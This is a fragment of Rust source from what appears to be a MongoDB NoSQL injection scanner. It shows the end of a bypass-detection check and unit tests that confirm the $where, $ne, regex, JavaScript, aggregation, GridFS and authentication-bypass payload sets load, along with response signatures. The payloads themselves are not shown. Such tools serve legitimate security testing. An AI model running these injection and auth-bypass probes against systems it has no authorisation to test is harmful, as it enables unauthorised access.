        if status.is_success() && technique.contains("bypass") {
            return true;
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = MongoScanner::new(config);
        // Scanner created successfully
        assert!(true);
    }

    #[test]
    fn test_where_payloads_loaded() {
        assert!(!WHERE_PAYLOADS.is_empty());
        assert!(WHERE_PAYLOADS.len() > 5);
    }

    #[test]
    fn test_ne_payloads_loaded() {
        assert!(!NE_PAYLOADS.is_empty());
        assert!(NE_PAYLOADS.len() > 3);
    }

    #[test]
    fn test_regex_payloads_loaded() {
        assert!(!REGEX_PAYLOADS.is_empty());
        assert!(REGEX_PAYLOADS.len() > 5);
    }

    #[test]
    fn test_operator_payloads_loaded() {
        assert!(!OPERATOR_PAYLOADS.is_empty());
        assert!(OPERATOR_PAYLOADS.len() > 20);
    }

    #[test]
    fn test_js_payloads_loaded() {
        assert!(!JS_PAYLOADS.is_empty());
        assert!(JS_PAYLOADS.len() > 10);
    }

    #[test]
    fn test_auth_bypass_payloads_loaded() {
        assert!(!AUTH_BYPASS_PAYLOADS.is_empty());
        assert!(AUTH_BYPASS_PAYLOADS.len() > 10);
    }

    #[test]
    fn test_aggregation_payloads_loaded() {
        assert!(!AGGREGATION_PAYLOADS.is_empty());
        assert!(AGGREGATION_PAYLOADS.len() > 5);
    }

    #[test]
    fn test_gridfs_payloads_loaded() {
        assert!(!GRIDFS_PAYLOADS.is_empty());
        assert!(GRIDFS_PAYLOADS.len() > 3);
    }

    #[test]
    fn test_nosql_params_loaded() {
        assert!(!NOSQL_PARAMS.is_empty());
        assert!(NOSQL_PARAMS.contains(&"username"));
        assert!(NOSQL_PARAMS.contains(&"password"));
    }

    #[test]
    fn test_success_signatures_loaded() {
        assert!(!NOSQL_SUCCESS_SIGNATURES.is_empty());
        assert!(NOSQL_SUCCESS_SIGNATURES.contains(&"welcome"));
    }

    #[test]
    fn test_error_signatures_loaded() {
        assert!(!NOSQL_ERROR_SIGNATURES.is_empty());
        assert!(NOSQL_ERROR_SIGNATURES.contains(&"MongoError"));
    }

    #[test]
    fn test_where_payloads_critical() {
        for (_, _, severity) in WHERE_PAYLOADS {
            assert_eq!(*severity, VulnSeverity::Critical, "$where payloads should be Critical");
        }
    }

    #[test]
    fn test_auth_bypass_mostly_critical() {
        let critical_count = AUTH_BYPASS_PAYLOADS
            .iter()
            .filter(|(_, _, s)| *s == VulnSeverity::Critical)
            .count();
        assert!(critical_count > AUTH_BYPASS_PAYLOADS.len() / 2);
    }
}
